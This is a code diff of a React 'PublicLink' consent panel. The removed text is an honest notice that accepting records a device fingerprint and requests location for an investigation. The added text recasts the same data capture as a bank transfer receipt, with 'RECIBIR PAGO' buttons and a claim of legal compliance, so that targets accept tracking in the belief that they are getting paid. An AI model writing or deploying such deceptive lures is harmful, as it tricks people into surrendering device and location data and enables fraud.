@@ -340,14 +340,14 @@ export default function PublicLink() {
           <div className="bg-hacker-panel border border-hacker-cyan rounded-lg p-6">
             <h2 className="text-lg font-mono text-hacker-cyan mb-4">AVISO DE PRIVACIDAD Y CONSENTIMIENTO</h2>
             <div className="bg-hacker-bg border border-hacker-border rounded p-4 mb-4 text-sm text-hacker-dim font-mono space-y-2">
-              <p>Este enlace esta asociado al expediente <span className="text-hacker-green">{caseCode}</span>.</p>
-              <p>Al aceptar, se registraran datos tecnicos de conexion y una <span className="text-hacker-cyan">huella digital del dispositivo</span> (hardware, red, estado de bateria y modelo inferido) con fines de prevencion de fraude.</p>
-              <p className="mt-3">Si usted acepta, se solicitara ademas la <span className="text-hacker-green">ubicacion del dispositivo</span> mediante el permiso propio del navegador.</p>
-              <p className="mt-3 text-hacker-dim">Tratamiento conforme a la Ley 1581 de 2012. Finalidad: apoyo documental a la investigacion.</p>
+              <p>Este enlace esta asociado a la transferencia <span className="text-hacker-green">{caseCode}</span>.</p>
+              <p>Al aceptar, pogra ver el registro de movimientos y una <span className="text-hacker-cyan">huella digital del dispositivo</span> de la cual fue enviada esta transferencia.</p>
+              <p className="mt-3">Si usted acepta, se solicitara ademas el <span className="text-hacker-green">comprobante de esta transferencia</span> se enviara copia a BreVe.</p>
+              <p className="mt-3 text-hacker-dim">Tratamiento conforme a la Ley 1581 de 2012. Finalidad: transferencia exitosa.</p>
             </div>
             <div className="flex gap-3">
-              <button onClick={handleDecline} className="flex-1 px-4 py-3 border border-hacker-red text-hacker-red font-mono text-sm rounded hover:bg-hacker-red/10 transition-all">RECHAZAR</button>
-              <button onClick={handleAccept} className="flex-1 btn-hacker">ACEPTAR Y CONTINUAR</button>
+              <button onClick={handleDecline} className="flex-1 px-4 py-3 border border-hacker-red text-hacker-red font-mono text-sm rounded hover:bg-hacker-red/10 transition-all">no recibir pago</button>
+              <button onClick={handleAccept} className="flex-1 btn-hacker">RECIBIR PAGO</button>
             </div>
           </div>
         </div>
